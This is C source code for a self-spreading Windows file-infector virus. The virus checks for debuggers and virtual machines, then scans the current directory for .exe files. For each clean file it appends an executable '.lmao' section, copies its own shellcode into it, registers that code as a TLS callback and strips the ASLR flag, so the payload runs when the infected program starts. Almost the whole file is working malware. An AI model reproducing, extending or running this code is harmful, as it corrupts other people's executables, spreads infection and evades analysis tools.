#include <Windows.h>
#include "peb-lookup.h"
#include "func-prototype.h"
#include "anti_debug.h"
#include "anti_vm.h"

#define MEM_ALIGN(size, align) ((size  + align - 1) & (~(align - 1)))

/// define sometemplate, for fast code :)))
#define CreateFileMappingA_res pCreateFileMappingA _CreateFileMappingA = (pCreateFileMappingA)_GetProcAddress(kernel32, aCreateFileMappingA)
#define CreateFileA_res pCreateFileA _CreateFileA = (pCreateFileA)_GetProcAddress(kernel32, aCreateFileA)
#define MapViewOfFile_res pMapViewOfFile _MapViewOfFile = (pMapViewOfFile)_GetProcAddress(kernel32, aMapViewOfFile)
#define UnmapViewOfFile_res pUnmapViewOfFile _UnmapViewOfFile = (pUnmapViewOfFile)_GetProcAddress(kernel32, aUnmapViewOfFile)
#define CloseHandle_res pCloseHandle _CloseHandle = (pCloseHandle)_GetProcAddress(kernel32, aCloseHandle)
#define GetFileSize_res pGetFileSize _GetFileSize = (pGetFileSize)_GetProcAddress(kernel32, aGetFileSize)
#define GetModuleFileNameA_res pGetModuleFileNameA _GetModuleFileNameA = (pGetModuleFileNameA)_GetProcAddress(kernel32, aGetModuleFileNameA)
#define RtlCopyMemory_res pRtlCopyMemory _RtlCopyMemory = (pRtlCopyMemory)_GetProcAddress(ntdll, aRtlCopyMemory)
#define FindFirstFileA_res pFindFirstFileA _FindFirstFileA = (pFindFirstFileA)_GetProcAddress(kernel32, aFindFirstFileA)
#define FindNextFileA_res pFindNextFileA _FindNextFileA = (pFindNextFileA)_GetProcAddress(kernel32, aFindNextFileA)
#define FindClose_res pFindClose _FindClose = (pFindClose)_GetProcAddress(kernel32, aFindClose)
#define LoadLibrary_res pLoadLibraryA _LoadLibraryA = (pLoadLibraryA)_GetProcAddress(kernel32, aLoadLibraryA)
#define MessageBoxA_res pMessageBoxA _MessageBoxA = (pMessageBoxA)_GetProcAddress(user32, aMessageBoxA)


// #define mset(buffer,val,size) for(size_t i =0 ; i<size; ++i) buffer[i] = val;
void mset(char * buffer, char val, size_t size)
{
    for(size_t i = 0; i < size; ++i)
        buffer[i] = val;
}



BOOL isInfected(HANDLE hFile, HANDLE kernel32, pGetProcAddress _GetProcAddress)
{
    /////////// Function resolution ///////////
    #pragma GCC diagnostic ignored "-Wcast-function-type"
    CreateFileMappingA_res;
    MapViewOfFile_res;
    UnmapViewOfFile_res;
    CloseHandle_res;
    #pragma GCC diagnostic pop

    /////////// Mapping file to memory ///////////
    HANDLE hFileMapping = _CreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
    LPVOID fileAddr = _MapViewOfFile(hFileMapping, PAGE_READWRITE, 0, 0 ,0);

    /////////// Headers ///////////
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER) fileAddr;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS) ((char *)fileAddr + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    BOOL ans = FALSE;
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i)
    {
        if (*(PDWORD64) &(sectionHeader->Name) == 0x6f616d6c2e) /// check if there is section name call .lmao
        {
            ans = TRUE;
        }
        if (*(PDWORD64) &(sectionHeader->Name) == 0x747865742e)
        {
            if (*(PDWORD64)((sectionHeader->PointerToRawData + (char*)fileAddr)) == 0x1040b948f0e48348)
            {
                ans = TRUE;
            }
        }
        sectionHeader++;
    }
    _UnmapViewOfFile(fileAddr);
    _CloseHandle(hFileMapping);
    return ans;
}

ULONG_PTR RVA2RA(LPVOID baseAddress, int RVA) {
    PIMAGE_DOS_HEADER dosHeader = baseAddress;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((char *)baseAddress + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders) ;

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i) {
        PIMAGE_SECTION_HEADER currentSection = sectionHeader + i;

        int VA = currentSection->VirtualAddress;
        int VS = currentSection->Misc.VirtualSize;
        if (VA <= RVA && RVA <= VA + VS) {
            return (ULONG_PTR)baseAddress + RVA - VA + currentSection->PointerToRawData;
        }
    }

    return -1;
}


DWORD getFileAlignment(HANDLE hFile, HANDLE kernel32, pGetProcAddress _GetProcAddress)
{
    /////////// Function resolution ///////////
    #pragma GCC diagnostic ignored "-Wcast-function-type"
    CreateFileMappingA_res;
    MapViewOfFile_res;
    UnmapViewOfFile_res;
    CloseHandle_res;
    #pragma GCC diagnostic pop

    /////////// get file aligment (store in headers) ////////////
    HANDLE hFileMapping = _CreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
    LPVOID baseMapping = _MapViewOfFile(hFileMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
    PIMAGE_DOS_HEADER dosHeader = baseMapping;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(dosHeader->e_lfanew + (char *)baseMapping);
    DWORD size = ntHeaders->OptionalHeader.FileAlignment;
    _UnmapViewOfFile(baseMapping);
    _CloseHandle(hFileMapping);
    return size;

}

DWORD getSectionAlignment(HANDLE hFile,HANDLE kernel32,  pGetProcAddress _GetProcAddress)
{
    /////////// Function resolution ///////////
    #pragma GCC diagnostic ignored "-Wcast-function-type"
    CreateFileMappingA_res;
    MapViewOfFile_res;
    UnmapViewOfFile_res;
    CloseHandle_res;
    #pragma GCC diagnostic pop

    /////////// get Section aligment (store in headers) ////////////
    HANDLE hFileMapping = _CreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
    LPVOID baseMapping = _MapViewOfFile(hFileMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
    PIMAGE_DOS_HEADER dosHeader = baseMapping;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(dosHeader->e_lfanew + (char *)baseMapping);
    DWORD size = ntHeaders->OptionalHeader.SectionAlignment;
    _UnmapViewOfFile(baseMapping);
    _CloseHandle(hFileMapping);
    return size;

}

PIMAGE_SECTION_HEADER addNewSection(HANDLE hFile, HANDLE kernel32, pGetProcAddress _GetProcAddress, 
                                                                    LPVOID fileAddr, DWORD64 fileName, DWORD rawSize, DWORD sectionSize)
{
    PIMAGE_DOS_HEADER dosHeader;
    PIMAGE_NT_HEADERS ntHeaders;
    PIMAGE_SECTION_HEADER sectionHeader;

    /////////// Get Headers ////////////////////
    dosHeader = (PIMAGE_DOS_HEADER) fileAddr;
    ntHeaders =(PIMAGE_NT_HEADERS) (dosHeader->e_lfanew + (char *)fileAddr);

    /////////// Get last section header ///////////
    sectionHeader = IMAGE_FIRST_SECTION(ntHeaders) + (ntHeaders->FileHeader.NumberOfSections - 1);

    /////////// Create new section header ///////////
    PIMAGE_SECTION_HEADER newSectionHeader = sectionHeader + 1;
    mset((char *)newSectionHeader, 0, sizeof(IMAGE_SECTION_HEADER));
    *(DWORD64 *)(newSectionHeader->Name) = fileName; //// set name
    newSectionHeader->Misc.VirtualSize = sectionSize;
    newSectionHeader->SizeOfRawData = rawSize;
    newSectionHeader->PointerToRawData = MEM_ALIGN(sectionHeader->PointerToRawData + sectionHeader->SizeOfRawData, 
                                            getFileAlignment(hFile, kernel32, _GetProcAddress));
    newSectionHeader->VirtualAddress = MEM_ALIGN(sectionHeader->VirtualAddress + sectionHeader->Misc.VirtualSize, 
                                            getSectionAlignment(hFile, kernel32, _GetProcAddress));
    // you can customize the characteristic, I am just lazy so set it as .text
    newSectionHeader->Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE;


    /////////// Update Headers /////////////////
    ntHeaders->FileHeader.NumberOfSections += 1 ;
    ntHeaders->OptionalHeader.SizeOfImage += (newSectionHeader->Misc.VirtualSize);
    return newSectionHeader;
}


void tlsInject(HANDLE hFile, HANDLE kernel32, pGetProcAddress _GetProcAddress, LPVOID fileAddr, DWORD64 callBackRVA)
{

    ////////// Get Information about TLS Direcotry //////////
    PIMAGE_DOS_HEADER dosHeader = fileAddr;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS) (dosHeader->e_lfanew + (char *)fileAddr);
    PIMAGE_DATA_DIRECTORY TLS_Directory = (PIMAGE_DATA_DIRECTORY)(&(ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS]));
    ULONGLONG imageBase = ntHeaders->OptionalHeader.ImageBase;

    ////////// Check if there is TLS Directory entry (the address is not null) //////////
    if (!(TLS_Directory->VirtualAddress)) ////////// If not, then create
    {
        PIMAGE_SECTION_HEADER tlsSection = addNewSection(hFile, kernel32, _GetProcAddress, fileAddr, 0x6674772e, 
                                                        getFileAlignment(hFile, kernel32, _GetProcAddress), // the size set to file alignment, since this section does not need to big
                                                        getSectionAlignment(hFile, kernel32, _GetProcAddress)); /// add new section name .wtf
        mset(tlsSection->PointerToRawData + (char *)fileAddr, 0, getFileAlignment(hFile, kernel32, _GetProcAddress)); 
        TLS_Directory->VirtualAddress = (DWORD) tlsSection->VirtualAddress;
        TLS_Directory->Size = sizeof(IMAGE_TLS_DIRECTORY);
        PIMAGE_TLS_DIRECTORY tmp = (PIMAGE_TLS_DIRECTORY)(tlsSection->PointerToRawData + (char *) fileAddr);
        tmp->StartAddressOfRawData = 0; ///not important, can be set to 0
        tmp->EndAddressOfRawData = 0; ///not important, can be set to 0 
        tmp->AddressOfIndex = imageBase + tlsSection->VirtualAddress + sizeof(IMAGE_TLS_DIRECTORY) - 8; /// it will poin to tlsSection->SizeofZero
        tmp->SizeOfZeroFill = 0; ///not important, can be set to 0
        tmp->Characteristics = 0x40000040;
        tmp->AddressOfCallBacks = imageBase + tlsSection->VirtualAddress + 0x50;
        *(ULONGLONG *)((char *)tmp + 0x50) = callBackRVA + imageBase;
        *(ULONGLONG *)((char *)tmp + 0x50 + 8) = 0; ///set it to make sure it end
    }   
    else //// If there is, then just add our callback function to the end of list
    {
        PIMAGE_TLS_DIRECTORY tlsSection = (PIMAGE_TLS_DIRECTORY)RVA2RA(fileAddr, TLS_Directory->VirtualAddress) ;
        PULONGLONG firstCallBack = (PULONGLONG)RVA2RA(fileAddr, tlsSection->AddressOfCallBacks - imageBase);
        while (*firstCallBack)
            ++firstCallBack;
        *firstCallBack = callBackRVA + imageBase;
        *(firstCallBack + 1) = 0;
    }

    /////////// Change file to NOPIE, this is important ///////////
    ntHeaders->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
}


PIMAGE_SECTION_HEADER getOurShellcodeSection(HANDLE hFile, HANDLE kernel32, pGetProcAddress _GetProcAddress, LPVOID fileAddr)
{
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER) fileAddr;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((char *) fileAddr + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    PIMAGE_SECTION_HEADER targetHeader = sectionHeader;
    for (int i =0 ; i<ntHeaders->FileHeader.NumberOfSections; ++i)
    {
        if ( *(PDWORD64)&(sectionHeader->Name)== 0x6f616d6c2e)
            return sectionHeader;
        if (*(PDWORD64)&(sectionHeader->Name) == 0x747865742e) /// find .text section
            targetHeader = sectionHeader;
        sectionHeader ++ ;
    }
    return targetHeader;
}

DWORD64 getOEP(HANDLE hFile, LPVOID fileAddr)
{
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER) fileAddr;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((char*)fileAddr + dosHeader->e_lfanew);
    DWORD64 oep = ntHeaders->OptionalHeader.ImageBase + (DWORD64)ntHeaders->OptionalHeader.AddressOfEntryPoint;
    return oep;
}


void inject(HANDLE hFile, HANDLE kernel32, pGetProcAddress _GetProcAddress, pLoadLibraryA _LoadLibraryA)
{
    /////////// Function resolution ///////////
    HMODULE ntdll = _LoadLibraryA(aNtDlldll);
    #pragma GCC diagnostic ignored "-Wcast-function-type"
    CloseHandle_res;
    CreateFileMappingA_res;
    MapViewOfFile_res;
    UnmapViewOfFile_res;
    GetModuleFileNameA_res;
    CreateFileA_res;
    RtlCopyMemory_res;
    GetFileSize_res;
    #pragma GCC diagnostic pop

    /////////// Check if file is already infect 
    if (isInfected(hFile, kernel32, _GetProcAddress))
    {   
        return; // do nothing
    }

    /////////// mapping current file (virus) to memory ///////////
    char baseName[MAX_PATH];
    _GetModuleFileNameA(NULL, baseName, MAX_PATH);
    HANDLE hBaseFile = _CreateFileA(baseName, GENERIC_READ , FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE hBaseFileMapping = _CreateFileMappingA(hBaseFile, NULL, PAGE_READONLY, 0, 0, NULL);
    LPVOID baseFileAddr = _MapViewOfFile(hBaseFileMapping, FILE_MAP_READ | FILE_MAP_COPY, 0, 0, 0);

    /////////// get our current shellcode ///////////
    PIMAGE_SECTION_HEADER shellcodeSection = getOurShellcodeSection(hBaseFile, kernel32, _GetProcAddress, baseFileAddr);
    DWORD shellcodeRawSize = shellcodeSection->SizeOfRawData;
    
    /////////// Some necessary parameters ///////////
    DWORD fileAlignment = getFileAlignment(hFile, kernel32, _GetProcAddress);
    DWORD sectionAlignment = getSectionAlignment(hFile, kernel32, _GetProcAddress);
    
    /////////// Mapping target to memory ///////////
    HANDLE hFileMapping = _CreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, 
                                            MEM_ALIGN(_GetFileSize(hFile, NULL) + shellcodeRawSize + fileAlignment, fileAlignment), NULL);
    LPVOID fileAddr = _MapViewOfFile(hFileMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
    
    /////////// tls inject ///////////
    PIMAGE_SECTION_HEADER malwareSection = addNewSection(hFile, kernel32, _GetProcAddress, fileAddr, 0x6f616d6c2e,
                                                                        MEM_ALIGN(shellcodeRawSize, fileAlignment),
                                                                        MEM_ALIGN(shellcodeRawSize, sectionAlignment));
    tlsInject(hFile, kernel32, _GetProcAddress, fileAddr, malwareSection->VirtualAddress);
    
    /////////// Copy Shellcode to mem ///////////
    _RtlCopyMemory((char *)fileAddr + malwareSection->PointerToRawData, 
                    (char *)baseFileAddr + shellcodeSection->PointerToRawData, shellcodeRawSize );

    /////////// Fix return adddress, so it return to OEP ///////////
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER) fileAddr;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((char*)fileAddr + dosHeader->e_lfanew);
    DWORD64 imageBase = ntHeaders->OptionalHeader.ImageBase ;
    // *(PDWORD64)(malwareSection->PointerToRawData + (char *)fileAddr + 0x31) = getOEP(hFile, fileAddr);
    *(PDWORD64)(malwareSection->PointerToRawData + (char *)fileAddr + 6) = imageBase + malwareSection->VirtualAddress + 0x300;

    /////////// Unmap, close handle everything ///////////
    _UnmapViewOfFile(fileAddr);
    _UnmapViewOfFile(baseFileAddr);
    _CloseHandle(hBaseFileMapping);
    _CloseHandle(hFileMapping);
    _CloseHandle(hBaseFile);

}

void spread(HANDLE kernel32, pGetProcAddress _GetProcAddress, pLoadLibraryA _LoadLibraryA) {
#pragma GCC diagnostic ignored "-Wcast-function-type"
    pFindFirstFileA _FindFirstFileA = (pFindFirstFileA)_GetProcAddress(kernel32, aFindFirstFileA);
    pFindNextFileA _FindNextFileA = (pFindNextFileA)_GetProcAddress(kernel32, aFindNextFileA);
    pFindClose _FindClose = (pFindClose)_GetProcAddress(kernel32, aFindClose);
    pCreateFileA _CreateFileA = (pCreateFileA) _GetProcAddress(kernel32, aCreateFileA);
    pCloseHandle _CloseHandle = (pCloseHandle) _GetProcAddress(kernel32, aCloseHandle);
#pragma GCC diagnostic pop

    WIN32_FIND_DATA ffd;

    char exe[] = {'*', '.', 'e', 'x', 'e', 0};
    HANDLE hFind = _FindFirstFileA(exe, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    do {
        HANDLE hFile = _CreateFileA(ffd.cFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if ((DWORD64)hFile == 0xffffffffffffffff) continue;
        if (!isInfected(hFile, kernel32, _GetProcAddress)) {
            inject(hFile,kernel32, _GetProcAddress, _LoadLibraryA);
        }
        _CloseHandle(hFile);
    } while (_FindNextFileA(hFind, &ffd));

    _FindClose(hFind);
}

void shellcode()
{
    #pragma GCC diagnostic ignored "-Wcast-function-type"
    HMODULE kernel32 = getModuleByName(aKernel32dll);
    pGetProcAddress _GetProcAddress = (pGetProcAddress)getFuncByName(kernel32, aGetProcAddress);
    pLoadLibraryA _LoadLibraryA = (pLoadLibraryA)_GetProcAddress(kernel32, aLoadLibraryA);
    HMODULE user32 = _LoadLibraryA(aUser32dll);
    pMessageBoxA _MessageBoxA = (pMessageBoxA)_GetProcAddress(user32, aMessageBoxA);
    #pragma GCC diagnostic pop
    if (isDebuggerPresentBit(kernel32, _GetProcAddress) == TRUE)
    {

        goto EXITDOOR;
    }
    if (detectWithNTQuery(kernel32, _GetProcAddress, _LoadLibraryA))
    {
        goto EXITDOOR;
    }
    if (detectCPUID_ManufactureID(kernel32, _GetProcAddress, _LoadLibraryA))
    {
        _MessageBoxA(NULL, aDetected, NULL,0);
        goto EXITDOOR;
    }
    if (detectCPUID_HypervisorBit())
    {
        _MessageBoxA(NULL, aDetected, NULL,0);
        goto EXITDOOR;
    }
    spread(kernel32, _GetProcAddress, _LoadLibraryA);
    _MessageBoxA(NULL, aOurGoal, NULL, 0); 
    EXITDOOR:
    return;
}